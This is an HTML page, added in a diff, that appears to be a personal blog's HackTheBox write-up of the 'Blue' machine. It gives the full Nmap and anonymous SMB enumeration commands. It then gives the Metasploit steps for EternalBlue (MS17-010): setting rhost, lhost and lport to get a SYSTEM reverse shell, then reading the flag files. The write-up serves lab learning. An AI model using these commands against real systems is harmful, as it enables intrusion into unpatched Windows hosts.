@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Blue</h1>
+        <img class="box-icon" src="/hack/images/blue.png"></img>
+        <p><i>Compromised on September 7, 2022</br>Written on February 3, 2024</i></p>
+        <p>
+            Blue is my fourth machine to compromise on HackTheBox. This machine features a Windows environment with the infamous EternalBlue exploit,
+            targeting the SMBv1 protocol. This exploit, before it was reported to Microsoft, was used for antiterrorism and counterintelligence by the NSA
+            for years. Unfortunately, when the NSA informed Microsoft about this exploit, the exploit was leaked. Hackers took advantage of this and performed
+            devastating large attacks.</br>This is one of the easiest machines on HackTheBox as the exploit is publicly available and easy. 
+            The first blood for root only took two minutes.
+        </p>
+
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.10.40 -Pn -p- --min-rate=5000</code></pre>
+        <img src="../images/blue2.png">
+        <p>Now that we know the open ports, let's scan for more details and get version number.</p>
+        <pre><code>nmap 10.10.10.40 -Pn -p135,139,445 -sC -sV --min-rate=5000</code></pre>
+        <img src="../images/blue3.png">
+        <h3>SMB - TCP port 445</h3>
+        <p>The only thing we can work with is port 445, which is running SMB and has guest access. Let's see what shares are available.</p>
+        <pre><code>smbclient -N -L //10.10.10.40</code></pre>
+        <img src="../images/blue4.png">
+        <p>Accessing the share "Share", there isn't anything here.</p>
+        <pre><code>smbclient -N //10.10.10.40/Share</br>dir</code></pre>
+        <img src="../images/blue5.png">
+        <p>Accessing the share "Users", there are other folders but they don't contain anything interesting.</p>
+        <pre><code>smbclient -N //10.10.10.40/Users</br>dir</code></pre>
+        <img src="../images/blue6.png">
+        <p>Searching the service and version on Google, we do get results for an exploit: MS17-010. Let's try this.</p>
+        <img src="../images/blue7.png">
+
+        <h2>Exploiting SMB using EternalBlue MS17-010</h2>
+        <p>Metasploit has this exploit available.</p>
+        <pre><code>msfconsole</br>search ms17-010</code></pre>
+        <img src="../images/blue8.png">
+        <p>We'll use the first one, set our options, and run the exploit</p>
+        <pre><code>use 0</br>set rhost 10.10.10.40</br>set lhost 10.10.14.3</br>set lport 4444</br>run</code></pre>
+        <img src="../images/blue9.png">
+        <p>The exploit worked, we now have a Meterpreter shell. We can drop a shell into the machine and check our user.</p>
+        <pre><code>shell</br>whoami</code></pre>
+        <img src="../images/blue10.png">
+        <p>We have a shell as NT AUTHORITY/SYSTEM, the highest privileged account. We'll get root and user flags next.</p>
+        <pre><code>dir C:\Users</br>more C:\Users\Administrator\Desktop\root.txt</br>more C:\Users\haris\Desktop\user.txt</code></pre>
+        <img src="../images/blue11.png">
+        <p>Full compromise.</p>
+    
+    </div>
+</body>
+
+</html>
